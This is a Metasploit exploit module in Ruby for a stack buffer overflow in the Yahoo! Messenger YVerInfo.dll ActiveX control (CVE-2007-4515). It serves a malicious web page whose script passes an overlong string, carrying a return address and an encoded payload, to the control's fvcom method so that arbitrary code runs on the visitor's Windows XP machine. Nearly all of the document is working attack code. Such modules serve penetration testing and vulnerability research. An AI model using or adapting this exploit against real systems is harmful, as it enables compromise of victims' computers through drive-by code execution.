##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yahoo! Messenger YVerInfo.dll ActiveX Control Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in the Yahoo! Messenger ActiveX
        Control (YVerInfo.dll <= 2006.8.24.1). By sending an overly long string
        to the "fvCom()" method from a yahoo.com domain, an attacker may be able
        to execute arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'CVE', '2007-4515' ],
          [ 'OSVDB', '37739' ],
          [ 'BID', '25494' ],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=591' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'         => 800,
          'BadChars'      => "\x00\x09\x0a\x0d'\\",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP2 Pro English',     { 'Ret' => 0x7cc58fd8  } ], # Tested on fully patched XPSP2 9/29/07
        ],
      'DisclosureDate' => '2007-08-30',
      'DefaultTarget'  => 0))
  end

  def autofilter
      false
  end

  def check_dependencies
      use_zlib
  end

  def on_request_uri(cli, request)
    # Re-generate the payload
    return if ((p = regenerate_payload(cli)) == nil)

    # Randomize some things
    vname	= rand_text_alpha(rand(100) + 1)
    strname	= rand_text_alpha(rand(100) + 1)

    # Set the exploit buffer
    sploit =  rand_text_english(411) + [target.ret].pack('V')
    sploit << p.encoded + rand_text_english(payload.encoded.length)

    # Build out the message
    content = %Q|
      <html>
      <object classid='clsid:D5184A39-CBDF-4A4F-AC1A-7A45A852C883' id='#{vname}'></object>
      <script language='javascript'>
      #{strname} = new String('#{sploit}');
      #{vname}.fvcom(#{strname});
      </script>
      </html>
      |

    print_status("Sending #{self.name}")

    # Transmit the response to the client
    send_response_html(cli, content)

    # Handle the payload
    handler(cli)
  end
end
